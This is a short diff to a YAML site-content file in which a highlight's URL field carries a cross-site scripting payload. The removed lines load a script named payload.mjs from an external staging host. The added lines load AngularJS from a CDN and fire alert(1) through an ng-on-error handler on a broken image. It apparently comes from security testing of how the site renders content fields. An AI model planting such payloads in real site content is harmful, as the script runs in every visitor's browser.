@@ -19,7 +19,10 @@ sections:
         - title: Highlight B
           description: Important highlight B is equally important
           url: https://test.com/"'>payload123<script
-            src="https://staging.d3lm7ksvtvt9eg.amplifyapp.com/files/payload.mjs"></script>payload444
+            src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.js"></script>
+            <img data-ng-app=""
+            data-ng-on-error="$event.target.ownerDocument.defaultView.alert(1)"
+            src="x">uu
         - title: Page A
           description: Page A is important too
           url: /privacy/
